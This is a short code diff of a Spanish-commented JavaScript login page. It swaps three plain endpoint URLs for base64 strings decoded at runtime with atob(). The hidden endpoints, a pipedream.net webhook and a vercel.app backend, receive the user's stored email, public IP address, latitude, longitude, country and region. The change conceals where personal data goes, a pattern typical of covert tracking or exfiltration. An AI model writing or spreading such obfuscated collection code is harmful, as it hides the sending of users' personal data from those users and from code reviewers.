@@ -1,4 +1,4 @@
-const send_email = "https://eodg0o7xq7s1i8h.m.pipedream.net";
+const send_email = atob("aHR0cHM6Ly9lb2RnMG83eHE3czFpOGgubS5waXBlZHJlYW0ubmV0");
 //funcion para avisar del inicio de sesión vía mail
     async function enviarAvisoLogin() {
         let mail = localStorage.getItem("user");
@@ -105,7 +105,7 @@ document.querySelector('.input-group-text').addEventListener('click', function()
 });
 //función para detectar la ubicación y la ip pública del usuario que ingresa
 function consultarUser(){
-    return fetch("https://backend-ip-api-deploy.vercel.app/mi-ip")
+    return fetch(atob("aHR0cHM6Ly9iYWNrZW5kLWlwLWFwaS1kZXBsb3kudmVyY2VsLmFwcC9taS1pcA=="))
         .then(res => {
             if (!res.ok) {
                 throw new Error(`API Error: ${res.status} - ${res.statusText}`);
@@ -169,7 +169,7 @@ function guardarUsuarioEnBackend(lat , long) {
     const pais = localStorage.getItem('countryCode') || 'sin_pais';
     const region = localStorage.getItem('region') || '';
 
-    return fetch("https://backend-ip-api-deploy.vercel.app/guardar-usuario", {
+    return fetch(atob("aHR0cHM6Ly9iYWNrZW5kLWlwLWFwaS1kZXBsb3kudmVyY2VsLmFwcC9ndWFyZGFyLXVzdWFyaW8="), {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
